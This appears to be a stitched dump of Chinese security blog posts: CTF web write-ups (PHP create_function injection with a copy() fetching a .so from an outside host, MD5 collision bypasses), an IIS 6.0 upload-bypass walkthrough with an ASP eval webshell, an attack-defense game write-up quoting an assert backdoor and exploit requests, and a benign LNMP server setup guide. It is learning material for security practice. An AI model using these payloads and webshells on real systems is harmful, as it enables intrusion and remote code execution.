result.replace(b'\\xc2\\x89'.decode(),\"\")处理了…这里比较恶心…其他没什么难度 里面的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556Private Function getPassword(ByVal str As String) As String Dim reString As String Dim i As Integer i = 1 While (i &lt;= Len(str)) reString = reString &amp; Mid(str, i, 1) i = i + (i Mod 5) Wend getPassword = reStringEnd FunctionPrivate Sub Command1_Click() Dim Dictionary As String Dictionary = \"VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=\" Dim password As String password = getPassword(Dictionary) Dim psw As String psw = Text1.Text If (psw = password) Then MsgBox \"The password is correct!\", vbOKOnly, \"������ȷ\" Text1.Text = \"Password for next pass : \" &amp; getPassword(password) Else MsgBox \"PasswordFail!\", vbOKOnly, \"�������\" End If End Sub 用 python 翻译一下 12345678910111213def getPassword(string):truei = 1truereString = ''truewhile i &lt;= len(string) :truetruereString = reString + string[i-1]truetruei = i + (i % 5)truereturn reStringDictionary = \"VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=\"password = getPassword(Dictionary)password = getPassword(password)print(password) 得到压缩包密码，解压得到的图片用 strings 看一下就是 flag 了 Web 6 not_easyDescriptionthis question is no easy 题目地址：http://120.79.1.69:8886/web6/ Hacking123456789101112131415 &lt;?phperror_reporting(0);if(isset($_GET['action'])) { $action = $_GET['action'];}if(isset($_GET['action'])){ $arg = $_GET['arg'];}if(preg_match('/^[a-z0-9_]*$/isD', $action)){ show_source(__FILE__);} else { $action($arg,'');} Code Breaking原题，只不过把 arg 的位置换了一下，无伤大雅，依旧可以用){return 123;}这种闭合形式绕过。接下来就是突破 disable_function 的限制了。 这里我直接用了 0ctf 的解法，因为有现成的 exp 就直接拿去用了。 1http://120.79.1.69:8886/web6/?action=\\create_function&amp;arg=){return%202333;}copy(%22http://106.14.153.173:8080/zedd.so%22,%22/www/wwwroot/www.sec.cn/web6/zedd.so%22);%2f%2f 后来看了一下可以简便一点，在_SERVER[\"SCRIPT_FILENAME\"]处发现绝对路径，然后用以下看当前文件 1http://120.79.1.69:8886/web6/?action=\\create_function&amp;arg=){return%202333;}var_dump(scandir(%22/www/wwwroot/www.sec.cn/web6%22));%2f%2f 可以看到我之前传上去的.so，也看到了还有两个 webshell ，直接file_get_contents读 flag 即可 看知乎还有人发了一开始没做题目隔离…还没用 docker …这个一拿到 shell 就拿到了其他题目了… Web 7 auditDescriptionaudit 题目地址：http://120.79.1.69:8887/web7/ Hacking123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 &lt;?phphighlight_file(__FILE__);include('flag.php');$str1 = @$_GET['str1'];$str2 = @$_GET['str2'];$str3 = @$_GET['str3'];$str4 = @$_GET['str4'];$str5 = (string)@$_POST['str5'];$str6 = (string)@$_POST['str6'];$str7 = (string)@$_POST['str7'];if( $str1 == $str2 ){ die('str1 OR Sstr2 no no no');}if( md5($str1) != md5($str2) ){ die('step 1 fail');}if( $str3 == $str4 ){ die('str3 OR str4 no no no');}if ( md5($str3) !== md5($str4)){ die('step 2 fail');}if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 ){ die('str5 OR str6 OR str7 no no no');}if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7)){ die('step 3 fail');}if(!($_POST['a']) and !($_POST['b'])){ echo \"come on!\"; die();}$a = $_POST['a'];$b = $_POST['b'];$m = $_GET['m'];$n = $_GET['n'];if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) { echo \"a OR b fail!\"; die();}if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) { echo \"m OR n fail\"; die();}$str8 = hash('md5', $a, false);$str9 = strtr(hash('md5', $b, false), $m, $n);echo \"&lt;p&gt;str8 : $str8&lt;/p&gt;\";echo \"&lt;p&gt;str9 : $str9&lt;/p&gt;\";if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)){ echo \"You're great,give you flag:\"; echo $flag;}str1 OR Sstr2 no no no 源码审计题，用数组可以绕过前面 4 个判断，str5 str6 str7 因为转成了字符串，所以需要强碰撞。这里可以利用Three way MD5 collision给的三个图片强行碰撞，但是比赛的时候由于自己对 python 这块不是特别熟，导致传这三个值老是传不了，最后赛后问了一下其他师傅要open().read()这样…（然而自己按照阿烨师傅的没加read()一直做不出来… 后面的可以自己 fuzz 一下，只要找到一个 md5 值可以变成0exxxxxx形式的字符串即可。这里用正则整了好一会 123456789for ($i=99999; $i &lt; 1000000; $i++) {true$str = md5($i);truetrue$p = '/^\\w{4}.[0-9]+$/';truetrueif (preg_match($p, $str)) { echo $i.\" \";truetruetrueecho md5($i);truetruetrueecho \"&lt;br&gt;\";truetrue}} 得到以下几个数 123204540 1a083126803757739236831994920755541725 2c125284818224703513551749833326598677 39dd6797642068546678043973187459 其他就迎刃而解了。附上脚本 1234567891011121314import requestsurl = \"http://120.79.1.69:8887/web7/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=1a&amp;n=0e\"data = { 'a':'QNKCDZO', 'b':204540, 'str5': open('black.jpg.coll').read(), 'str6': open('brown.jpg.coll').read(), 'str7': open('white.jpg.coll').read()}proxies = {true'http':'http://127.0.0.1:8080'}r = requests.post(url,data = data,proxies=proxies)print r.text Web 8 真的是 WebDescription真的是web，格式jactf{} 题目地址：http://120.79.1.69:8887/web8/ Hacking是个 WebAssembly 的题，原本算在 web 的，后面放到 rev 去了，就没看了。 Conclusion整个比赛还是比较简单的，可以说整个比赛没有自己比赛的东西，算不上是高质量比赛，没学到什么其他的东西。把 python 又撸了一遍…简直，python3 字符编码真的有点恶心… web8 可能以后有空回回来看看，其他就没什么了。不过听说比赛主办方还是在校生…那也是挺辛苦的hhhh…还是对主办方的辛苦运维表示感谢","link":"/2019/04/06/%E6%8E%98%E5%AE%89%E6%9D%AFWeb/"},{"title":"服务器配置的那些事--基于LNMP","text":"感觉还是自己搭个服务器比较好。之前是大一下学期就想搭了的，只是当时好像已经开始实行了域名备案措施，江苏备案还要暂住证，就没去弄了，感觉自己用ip弄博客太傻了，所以还是一直用之前在某个博客系统上的博客。那个博客也有很多自己写的东西，而且有些还见不得人的东西-&gt;_-&gt; 所以这篇就用来记录一下就搭建服务器的一些坑 服务器用的是的vultr提供的，域名godaddy。系统centos 7.2 0x0\b一开始Vultr选好服务器以后，会有个Startup Script的选项，这个选项是可以执行一些服务器建好以后运行的脚本 1234567891011#!/bin/sh# NOTE: This is an example that sets up SSH authorization. To use it, you'd need to replace \"ssh-rsa AA... youremail@example.com\" with your SSH public.# You can replace this entire script with anything you'd like, there is no need to keep itmkdir -p /root/.sshchmod 600 /root/.sshecho ssh-rsa AA... youremail@example.com &gt; /root/.ssh/authorized_keyschmod 700 /root/.ssh/authorized_keys 这是Vultr给的示例脚本示例。这样子的话，每次建服务器只需要你写好脚本就可以配置\b好一些通用的组件了，\b例如Nginx、php等。 我自己\b写的脚本不是很好，就不放出来了。 0x1然后就是先开始配置nginx了 1.添加Nginx到YUM源添加CentOS 7 Nginx yum资源库,打开终端,使用以下命令: sudo rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm然后为了是最新稳定的Nginx，又特地去修改了yum的nginx.repo [nginx] name=nginx repo baseurl=http://nginx.org/packages/mainline/OS/OSRELEASE/$basearch/ gpgcheck=0 enabled=1按照\b官方文档来修改 2.开始安装Nginx在你的CentOS 7 服务器中使用yum命令从Nginx源服务器中获取来安装Nginx： sudo yum install -y nginx3.启动Nginx刚安装的Nginx不会自行启动。运行Nginx: sudo systemctl start nginx.service然后可以通过 curl localshost来查看Nginx是否启动成功 4.CentOS 7 开机启动Nginxsudo systemctl enable nginx.service5.\b一些Nginx的常用目录网站文件存放默认目录: /usr/share/nginx/html网站默认站点配置: /etc/nginx/conf.d/default.conf自定义Nginx站点配置文件存放目录: /etc/nginx/conf.d/Nginx全局配置 /etc/nginx/nginx.conf6.\b注意事项比较坑的是\b一开始我只想配个Nginx\b然后配域名试试能不能访问，结果\b配好Nginx之后直接访问ip发现\b\b无法\b访问。然后考虑ip被墙了，但是吧,ping了ip还是能ping通的，但是无论挂不挂代理都还是不能访问。这就比较郁闷了。 后来经过提醒，用 ss -tan 查看\b了一下端口\b，发现80已经\b是处于监听\b状态了，这就比较奇怪了，再去扫了一下服务器的端口，\b这时候发现80端口是关闭的。 百思不得其解，难道Vultr也有阿里云的那种安全防护，得\b手动打开？ \b然后问了一下大佬，就可能是防火墙的\b问题了。 Centos是自带的firewall,iptables,但是iptables还得配置，我们就不用iptables了，就用自带的firewalld了 开始排查防火墙 先看看80是否开启 firewall-cmd --query-port=80/tcp显示 no果然是因为防火墙屏蔽了80端口，然后我们通过 firewall-cmd --zone=public --add-port=80/tcp --permanent打开80端口，显示 success即可开启80端口，然后重启防火墙 systemctl [start|stop|restart] firewalld.service 终于可以看到熟悉的Nginx界面了。\b 0x2接着就是MariaDB 1.安装:yum install mariadb mariadb-server2.启动systemctl start mariadb3.开机启动systemctl enable mariadb4.配置MariaDBmysql_secure_installation5.测试mysql -u root -p0x3再装php Vultr有比较详细的安装教程,我就贴出来了。这里装的是php7.1 然后再安装个php-fpm yum install php71w-fpm这里注意的是php7.1是php71w的前缀 接下来进入Nginx的目录配置nginx.conf或者是/conf.d/default.d，一般目录是在/etc/nginx/,把下面这段注释取消就好了。\b location ~ \\.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi_params; }值得一提的是，我在配阿里云都没出现在过什么问题，但是就是配Vultr就出现了一些坑 首先是出现了 connect() failed (111: Connection refused) while connecting to upstream, server: localhost, request: \"GET /xxx.php HTTP/1.1\", upstream: \"fastcgi://127.0.0.1:9000\"这个就是php-fpm忘记开了 然后又碰到了File Not Found的错误,cat了error.log看一下: FastCGI sent in stderr: \"Primary script unknown\" while reading response header from upstream, server: localhost, request: \"GET /test.php HTTP/1.1\", upstream: \"fastcgi://127.0.0.1:9000\"这就比较郁闷了，不过Google还是能找到的，反正就是说File Not Found，看了一下原来是location的root配置问题， location ~ \\.php$ { root /usr/share/nginx/html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /$document_root$fastcgi_script_name; include fastcgi_params; }特别要注意root指向的位置，这又是比较坑的东西。\b 然后就是安装typecho的坑了。 0x4这里就简单提提typecho的坑。第一个就是与nginx的配置，这个还好有文档，但是只能解决我的 无法登录后台，点击前台链接或者后台登录时出现\"404, not found\"这个问题 \b还有出现的一个问题就是typecho的登录302的问题。 还好有大佬直接给了我解决方案: 在config.inc.php加入define('__TYPECHO_SECURE__',1);后来查了一下发现\b这个是用来开启https访问typecho的设置 /** 开启HTTPS */ define('__TYPECHO_SECURE__',true);具体可以参照一下这篇文章 还有typecho\b点击评论确\b无法评论的问题，只要在typecho管理员控制台中在永久链接中把自定义文章路径\b 默认是 默认风格 /archives/{cid}/改成 wordpress风格 /archives/{slug}.html具体原因没查，我猜\b也是nginx与typecho的pathinfo\b问题 0x5这篇文章主要就到这吧，\b后续会增加一些自己以后遇到的问题","link":"/2018/03/03/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8ELNMP/"},{"title":"记一道比较简单的上传绕过","text":"在某靶场做题的时候发现有个知识盲区，顺手记一记。 信息收集页面非常简单，就一个上传的选择框以及点击上传，没有前端过滤。由于做php的题总是太习惯了，根本没太注意回应头的内容 1Server: Microsoft-IIS/6.0 这里用的IIS做服务器，而且上传页面还是个asp页面。所以我们需要一个asp马上传上去就好了。 试探这道题的上传逻辑是先检查你的后缀名，只要不是在服务端允许的白名单之内就拒绝上传。于是我们只能改后缀进行上传。不过还有个点是他上传完以后，还会将你的文件名改成上传时间，基本上就是个这么个情况 123456789&lt;html&gt;&lt;head&gt;&lt;title&gt;文件上传&lt;/title&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=gb2312\"&gt;&lt;meta http-equiv=\"Content-Language\" Content=\"zh-CN\"&gt;&lt;/head&gt;&lt;body leftmargin=\"10\" topmargin=\"10\" bgcolor=\"#FFFFFF\"&gt;内部办公文件上传入口&lt;br&gt;&lt;br&gt;上传文件：/shell-asp.jpg&lt;br&gt;文件大小：25 字节&lt;br&gt;返回地址：upload/2018626032150.jpg &lt;br&gt;&lt;br&gt;共 1 个文件成功上传到服务器! &lt;br&gt;&lt;br&gt;&lt;input type=\"button\" value=\" 返 回 \" onclick=\"javascript:history.back();\"&gt;&lt;/body&gt;&lt;/html&gt; 当时想用%00啥的绕过，发现根本不可能，因为他会把你上传之后的文件名改掉，所以根本不可能用这个方法。 解决看了一下hint提示了关注服务器类型，然后就注意到了Server: Microsoft-IIS/6.0，这里可以用iis的一个路径解析漏洞。 使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。 目录解析(6.0)形式：www.xxx.com/xx.asp/xx.jpg原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。 文件解析形式：www.xxx.com/xx.asp;.jpg原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。 解析文件类型IIS6.0 默认的可执行文件除了asp还包含这三种 :/test.asa/test.cer/test.cdx 这里一开始我也傻逼地还光顾着去改文件名去利用解析漏洞，试过一次才发现文件名是一直被对方控制的。 认真看请求主体可以发现 12345678910111213141516171819202122------WebKitFormBoundaryz7FvAglTc7ApQHRXContent-Disposition: form-data; name=\"act\"upload------WebKitFormBoundaryz7FvAglTc7ApQHRXContent-Disposition: form-data; name=\"upcount\"1------WebKitFormBoundaryz7FvAglTc7ApQHRXContent-Disposition: form-data; name=\"GuFolderPath\"upload------WebKitFormBoundaryz7FvAglTc7ApQHRXContent-Disposition: form-data; name=\"file1\"; filename=\"/shell-asp.asp/1.jpg\"Content-Type: application/octet-stream&lt;%eval request(\"value\")%&gt;------WebKitFormBoundaryz7FvAglTc7ApQHRXContent-Disposition: form-data; name=\"Submit\"------WebKitFormBoundaryz7FvAglTc7ApQHRX-- 中间有两个upload，这样子，我联想到之前做过的，这必定就是上传路径无疑了，所以我们只需要将其改成upload/xxx.asp配合解析漏洞利用就可以连上shell了，修改完成后上传返回 123456789&lt;html&gt;&lt;head&gt;&lt;title&gt;文件上传&lt;/title&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=gb2312\"&gt;&lt;meta http-equiv=\"Content-Language\" Content=\"zh-CN\"&gt;&lt;/head&gt;&lt;body leftmargin=\"10\" topmargin=\"10\" bgcolor=\"#FFFFFF\"&gt;内部办公文件上传入口&lt;br&gt;&lt;br&gt;上传文件：/shell-asp.asp/1.jpg&lt;br&gt;文件大小：25 字节&lt;br&gt;返回地址：upload/1.asp/2018626032150.jpg &lt;br&gt;&lt;br&gt;共 1 个文件成功上传到服务器! &lt;br&gt;&lt;br&gt;&lt;input type=\"button\" value=\" 返 回 \" onclick=\"javascript:history.back();\"&gt;&lt;/body&gt;&lt;/html&gt; 直接访问返回地址的路径，由于6.0解析漏洞，这个在服务器上即使是图片也被当作asp解析，所以我们直接可以以upload/1.asp/2018626032150.jpg连上shell拿到flag 源码脸上shell后特地去拿了一波源码，Upload.asp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133&lt;%OPTION EXPLICIT%&gt;&lt;%Server.ScriptTimeOut=5000%&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;文件上传&lt;/title&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=gb2312\"&gt;&lt;meta http-equiv=\"Content-Language\" Content=\"zh-CN\"&gt;&lt;/head&gt;&lt;body leftmargin=\"10\" topmargin=\"10\" bgcolor=\"#FFFFFF\"&gt;&lt;!-- #include file=\"upload_5xsoft.inc\" --&gt;&lt;%dim upload,file,formName,iCount,FolderNameNewdim GuFolderPath,fso,GuFolder0,GuFileSize0,GuFileExt0,GuAutoNameset upload=new upload_5xsoft '建立上传对象trueGuFolder0=\"upload/\" '设定默认上传的目录，必须以“/”结束，可以为空trueGuFileSize0=2048 '设定默认允许上传的最大文件，单位:K，1024K=1MtrueGuFileExt0=\"bmp|gif|jpg|jpeg|png|swf|rar|zip|txt\" '设定默认允许上传的文件类型trueGuAutoName=\"1\" '设定上传成功后的文件名是否自动重新命名或是使用原来的名称，1为是，0为否trueResponse.write upload.Version&amp;\"&lt;br&gt;&lt;br&gt;\" '显示上传类的版本if upload.form(\"GuFolderPath\")&lt;&gt;\"\" thentrueGuFolderPath=upload.form(\"GuFolderPath\")truecall FolderNameCheck(GuFolderPath)trueGuFolderPath=upload.form(\"GuFolderPath\")trueif right(GuFolderPath,1)&lt;&gt;\"/\" then GuFolderPath=GuFolderPath&amp;\"/\"elseif upload.form(\"GuFolderPath\")=\"\" and GuFolder0&lt;&gt;\"\" thentrueGuFolderPath=GuFolder0truecall FolderNameCheck(GuFolderPath)trueGuFolderPath=GuFolder0trueif right(GuFolderPath,1)&lt;&gt;\"/\" then GuFolderPath=GuFolderPath&amp;\"/\"elsetrueGuFolderPath=\"\"end iftrueiCount=0for each formName in upload.objFile '列出所有上传了的文件trueset file=upload.file(formName)trueif file.FileSize&gt;0 thentruetruedim FileExtF,FileExtY,FileExtOK,ii,jjtruetrueFileExtF=split(File.FileName,\".\")truetruefor jj=0 to ubound(FileExtF)truetruenexttruetrueFileExtY=0truetrueFileExtOK=split(GuFileExt0,\"|\")truetruetruetruefor ii=0 to ubound(FileExtOK)truetrueif FileExtOK(ii)=FileExtF(jj-1) thentruetruetrueFileExtY=1truetrueexit fortruetrueend iftruetruenexttruetrueif FileExtY=0 thentruetruetrueHtmend \"上传失败，不允许上传的文件类型\"truetrueelseif file.FileSize&gt;GuFileSize0*1024 thentruetruetrueHtmend \"上传失败，单个文件大小超过限制，最大\"&amp;GuFileSize0&amp;\"*1024 字节，1K=1024字节\"truetrueelsetruetruetruedim FileNameOKtruetruetrueif GuAutoName=\"1\" thentruetruetruetrueFileNameOK=year(now)&amp;month(now)&amp;day(now)&amp;hour(now)&amp;minute(now)&amp;second(now)&amp;iCount&amp;\".\"&amp;FileExtF(jj-1)truetruetrueelsetruetruetruetrueFileNameOK=file.FileNametruetruetrueend iftruetruetruefile.SaveAs Server.mappath(GuFolderPath&amp;FileNameOK) '保存文件truetruetrueResponse.write \"上传文件：\"&amp;file.FileName&amp;\"&lt;br&gt;文件大小：\"&amp;file.FileSize&amp;\" 字节&lt;br&gt;返回地址：\"&amp;GuFolderPath&amp;FileNameOK&amp;\" &lt;br&gt;\"truetruetrueiCount=iCount+1truetrueend iftrueelsetruetrueHtmend \"上传失败，请选择要上传的文件\"trueend iftrueset file=nothingnexttrueset upload=nothingtrueHtmend \"共 \"&amp;iCount&amp;\" 个文件成功上传到服务器!\"Sub FolderNameCheck(FolderNameNew)truedim Letters,i,ctrueLetters=\"+=:;,[]&lt;&gt;\\|*?\"truefor i=1 to len(FolderNameNew)truetruec=mid(FolderNameNew,i,1)truetrueif inStr(Letters,c)&lt;&gt;0 thentruetrueHtmend \"上传失败，文件夹名称含有特殊字符\"trueend iftruenexttrueGuFolderPath=server.MapPath(GuFolderPath)trueSet fso=Server.CreateObject(\"Scripting.FileSystemObject\")trueif fso.FolderExists(GuFolderPath)=false thentruetruefso.CreateFolder(GuFolderPath)trueend iftrueSet fso=nothingEnd subSub HtmEnd(Msg) set upload=nothing response.write \"&lt;br&gt;\"&amp;Msg&amp;\" &lt;br&gt;&lt;br&gt;&lt;input type=\"\"button\"\" value=\"\" 返 回 \"\" onclick=\"\"javascript:history.back();\"\"&gt;&lt;/body&gt;&lt;/html&gt;\" response.endEnd sub%&gt;&lt;/body&gt; &lt;/html&gt;","link":"/2018/06/26/%E8%AE%B0%E4%B8%80%E9%81%93%E6%AF%94%E8%BE%83%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"title":"记几次攻防赛","text":"好久没发博客了…主要是比赛太多了…这几个月周末几乎无休，基本都是各种比赛 先慢慢来总结吧。 “西湖论剑”杯线下AWD前一个小时和平发育，基本没人打…也不知道为啥… 这次也是我第二次参加AWD，第一次是在大一暑假参加的XMan结营赛的攻防…那时候啥都不懂，基本就是靠队内大佬带飞，直接飞到了团队第六，也就帮帮大佬传传shell啥的，不过也对攻防赛有了一个大致的印象。 这次AWD参选审核还是比较水的…当时好多都不知道怎么打的都来参加了…我还以为是大佬云集，我会被打的电脑都开不了的那种2333…感觉大家都还差不多…身后那支队后来直接放弃了，聊起天来了… 赛后想想，一开始没人打真的挺奇怪的，因为给的洞非常明显 这里放一个一叶飘零大佬的赛时分析文章吧，我觉得写得非常好的，还是多应该向大佬学习学习 Poc 1首先在mobile\\themes\\default\\auction_list.dwt中有一个很明显的一句话马 {:assert($_POST[1])} 这里要是谁发现的早，应该很快就可以打了…只是没人打…但是这也是赛中官方给了hint我们才发现的… 赛后用D盾扫了一遍啥洞都没发现… 后来的poc都是抄作业抄过来的…当时也是被打得挺惨的…还是抓log后来才知道怎么打…还是经验太少了 基本抄的还是这个点 123post方式文件url：http://10.50.33.2/mobile/index.php?m=default&amp;c=auction参数：1=phpinfo() Poc 1 分析首先，先看assert()，参照php文档。 PHP 5 bool assert ( mixed $assertion [, string $description ] ) PHP 7 bool assert ( mixed $assertion [, Throwable $exception ] ) 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行 很经典的一个一句话马 再看为什么在dwt文件里面就可以 dwt 文件是网页模板文件(Dreamweaver Template), 在创建网站的多个网页的时候，通常可以将网页的共同部分创建成为一个模板， 然后给多个网页调用， 以实现网页代码的重复利用· 制作模板的时候， 用户可以自定义的模板可编辑区域和非可编辑区域， 可编辑区域将在调用模板的网页中再次填充代码 既然是个网页模版，而整个站都用的是php，模版里的字符串自然会被当作php来解析。所以这里一句话马可以被执行 Poc 2参照一叶飘零大佬的 123post方式文件url：http://10.50.%s.2/mobile/index.php参数：url=http://10.0.1.2?token=队伍token Poc 2 分析我们从mobile/index.php开始分析： 1234567891011&lt;?php /* 访问控制 */ define('IN_ECTOUCH', true); /* 设置系统编码格式 */ header(\"Content-Type:text/html;charset=utf-8\"); /* 设置系统编码格式 */ header(\"Pragma: no-cache\"); /* 修复后退没有提交数据的问题 */ header(\"Cache-control: private\"); /* 加载核心文件 */ require ('include/EcTouch.php'); 跟踪require(...)函数，看到EcTouch.php 123456789101112&lt;?php /* 访问控制 */ defined('IN_ECTOUCH') or die('Deny Access'); if (version_compare(PHP_VERSION, '5.2.0', '&lt;')) die('require PHP &gt; 5.2.0 !'); defined('BASE_PATH') or define('BASE_PATH', dirname(__FILE__) . '/'); defined('ROOT_PATH') or define('ROOT_PATH', realpath(dirname(__FILE__) . '/../') . '/'); defined('APP_PATH') or define('APP_PATH', BASE_PATH . 'apps/'); defined('ADDONS_PATH') or define('ADDONS_PATH', ROOT_PATH . 'plugins/'); defined('DEFAULT_APP') or define('DEFAULT_APP', 'default'); defined('DEFAULT_CONTROLLER') or define('DEFAULT_CONTROLLER', 'Index'); defined('DEFAULT_ACTION') or define('DEFAULT_ACTION', 'index'); 再来看APP_PATH这个路径apps/，下面会有三个文件夹 123admindefaultinstall 首先查看默认文件夹default，看到又有5个文件夹 12345commonconfcontrollerlanguagemodel 再按照顺序首先来看第一个common，发现两个php文件 12function.phpinsert.php 在function.php中有个上传的函数比较可疑 1234567891011121314151617181920212223242526272829function upload_file($upload, $type) { if (!empty($upload['tmp_name'])) { $ftype = check_file_type($upload['tmp_name'], $upload['name'], '|png|jpg|jpeg|gif|doc|xls|txt|zip|ppt|pdf|rar|docx|xlsx|pptx|'); if (!empty($ftype)) { $name = date('Ymd'); for ($i = 0; $i &lt; 6; $i++) { $name .= chr(mt_rand(97, 122)); } $name = $_SESSION['user_id'] . '_' . $name . '.' . $ftype; $target = ROOT_PATH . DATA_DIR . '/' . $type . '/' . $name; if (!move_upload_file($upload['tmp_name'], $target)) { ECTouch::err()-&gt;add(L('upload_file_error'), 1); return false; } else { return $name; } } else { ECTouch::err()-&gt;add(L('upload_file_type'), 1); return false; } } else { ECTouch::err()-&gt;add(L('upload_file_error')); return false; }} 而且这个函数在留言板中被调用，是否能利用还有待研究，function.php中的其他函数基本没什么异常 再来看insert.php，可以发现有个insert_ads()函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879function insert_ads($arr) { static $static_res = NULL; $time = gmtime(); if (!empty($arr['num']) &amp;&amp; $arr['num'] != 1) { $sql = 'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, ' . 'p.ad_height, p.position_style, RAND() AS rnd ' . 'FROM ' . M()-&gt;pre . 'touch_ad ' . ' AS a ' . 'LEFT JOIN ' . M()-&gt;pre . 'touch_ad_position ' . ' AS p ON a.position_id = p.position_id ' . \"WHERE enabled = 1 AND start_time &lt;= '\" . $time . \"' AND end_time &gt;= '\" . $time . \"' \" . \"AND a.position_id = '\" . $arr['id'] . \"' \" . 'ORDER BY rnd LIMIT ' . $arr['num']; $res = M()-&gt;query($sql); } else { if ($static_res[$arr['id']] === NULL) { $sql = 'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, ' . 'p.ad_height, p.position_style, RAND() AS rnd ' . 'FROM ' . M()-&gt;pre . 'touch_ad ' . ' AS a ' . 'LEFT JOIN ' . M()-&gt;pre . 'touch_ad_position' . ' AS p ON a.position_id = p.position_id ' . \"WHERE enabled = 1 AND a.position_id = '\" . $arr['id'] . \"' AND start_time &lt;= '\" . $time . \"' AND end_time &gt;= '\" . $time . \"' \" . 'ORDER BY rnd LIMIT 1'; $static_res[$arr['id']] = M()-&gt;query($sql); } $res = $static_res[$arr['id']]; } $ads = array(); $position_style = ''; foreach ($res AS $row) { if ($row['position_id'] != $arr['id']) { continue; } $position_style = $row['position_style']; switch ($row['media_type']) { case 0: // 图片广告 $src = (strpos($row['ad_code'], 'http://') === false &amp;&amp; strpos($row['ad_code'], 'https://') === false) ? __URL__ . \"/$row[ad_code]\" : $row['ad_code']; $ads[] = \"&lt;a href='\" . url('default/affiche/index', array('ad_id' =&gt; $row['ad_id'], 'uri' =&gt; urlencode($row[\"ad_link\"]))) . \"' target='_blank'&gt;&lt;img src='$src' width='\" . $row['ad_width'] . \"' height='$row[ad_height]' border='0' /&gt;&lt;/a&gt;\"; break; case 1: // Flash $src = (strpos($row['ad_code'], 'http://') === false &amp;&amp; strpos($row['ad_code'], 'https://') === false) ? __URL__ . \"/$row[ad_code]\" : $row['ad_code']; $ads[] = \"&lt;object classid=\\\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\\\" \" . \"codebase=\\\"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0\\\" \" . \"width='$row[ad_width]' height='$row[ad_height]'&gt; &lt;param name='movie' value='$src'&gt; &lt;param name='quality' value='high'&gt; &lt;embed src='$src' quality='high' 